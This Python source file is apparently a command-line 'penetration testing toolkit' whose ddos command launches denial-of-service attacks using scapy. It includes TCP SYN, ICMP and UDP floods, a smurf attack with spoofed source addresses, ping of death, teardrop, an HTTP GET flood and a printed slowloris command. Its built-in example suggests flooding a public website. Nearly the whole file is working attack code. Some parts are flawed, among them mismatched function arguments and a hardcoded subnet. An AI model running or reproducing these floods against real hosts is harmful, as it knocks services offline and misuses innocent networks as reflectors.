import click, time, requests, os
from scapy.all import *
from scapy.layers.inet import *
from threading import Thread

send_host = requests.get("https://api.ipify.org").text

@click.group()
def launch():
    """
    \b
       ________  ___   _________  ________  ___  ________  ________
      |\   __  \|\  \ |\___   ___\\\\   __  \|\  \|\   ____\|\   __  \ 
      \ \  \|\  \ \  \\\\|___ \  \_\ \  \|\  \ \  \ \  \___|\ \  \|\  \ 
       \ \   __  \ \  \    \ \  \ \ \   __  \ \  \ \  \    \ \   __  \ 
        \ \  \ \  \ \  \____\ \  \ \ \  \ \  \ \  \ \  \____\ \  \ \  \ 
         \ \__\ \__\ \_______\ \__\ \ \__\ \__\ \__\ \_______\ \__\ \__\ 
          \|__|\|__|\|_______|\|__|  \|__|\|__|\|__|\|_______|\|__|\|__|
                                                                      
                                    Altaica Penetration Testing Toolkit
    \b
    """

@click.option('--dostype', '-t', default="", help='Type of DoS')
@click.option('--host', '-h', default="127.0.0.1", show_default=True, help='Host to send')
@click.option('--port', '-p', default=80, show_default=True, help='Port to send')
@click.option('--count', '-c', default=1, show_default=True, help='Number of packets to send')
@click.option('--examples', '-e', is_flag=True, help='Examples')
@click.option('--lists', '-l', is_flag=True, help='DoS lists')
@launch.command()
def ddos(dostype, host, port, count, examples, lists):
    """\b
    dostype-list
        tcp_syn_flood(host, port, count)
        smurf(host, count)
        udp_flood(host, port, count)
        http_get_flood(host, count)
        slowloris(host, port, count)
        ping_of_death(host, count)
        teardrop(host, count)
    """
    if examples:
        print("altaica ddos --dostype http_get_flood --host https://www.google.com --count 1")
        return

    if lists:
        print("tcp_syn_flood(host, port, count)")
        print("smurf(host, count)")
        print("icmp_flood(host, count)")
        print("udp_flood(host, port, count)")
        print("http_get_flood(host, count)")
        print("slowloris(host, port, count)")
        print("ping_of_death(host, count)")
        print("teardrop(host, count)")
        return

    doslist = ["tcp_syn_flood", "smurf", "icmp_flood", "udp_flood", "http_get_flood", "slowloris", "ping_of_death", "teardrop"]
    if (dostype == "") or (dostype not in doslist):
        print("Error: -t option requires an argument")
        return

    threads = []
    for i in range(count):
        th = Thread(target=eval(dostype), args=(host, port, count))
        th.start()
        threads.append(th)

    for i in threads:
        i.join()

def tcp_syn_flood(host, port, count):
    packet=IP(src=send_host, dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
    send(packet, inter = .001, loop=True)

def smurf(host, port, count):
    a = arping('192.168.13.0/24', verbose=0)
    # a = arping('192.168.0.255/16', verbose=0)
    for i in a[0]:
        smurf_2(host, i[0].pdst)

def smurf_2(host, dsthost):
    packet=IP(src=host,dst=dsthost)/ICMP()
    send(packet, inter = .001, loop=True)

def icmp_flood(host, port, count):
    packet=IP(src=send_host, dst=host) / ICMP()
    send(packet, inter = .001, loop=True)

def udp_flood(host, port, count):
    packet=IP(src=send_host, dst=host) / UDP(sport=RandShort(), dport=port) / ('X'*1000)
    send(packet, inter = .001, loop=True)

def http_get_flood(host, port, count):
    URL = host
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' }
    r = requests.get(URL, headers=headers)

def slowloris(host, port, count):
    print(f"perl slowloris.pl -dns {host} -port {port} -timeout 100 -num {count}")
    exit()

def ping_of_death(host, port, count):
    for p in fragment(IP(src=RandIP(), dst=host)/ICMP()/("X"*60000)):
        send(p)

def teardrop(host, port, count):
    send(IP(src=send_host, dst=host, proto=17, flags="MF")/UDP()/("X"*10))
    send(IP(src=send_host, dst=host, proto=17, frag=48)/("X"*116))
    send(IP(src=send_host, dst=host, proto=17, flags="MF")/UDP()/("X"*224))

if __name__ == '__main__':
    launch()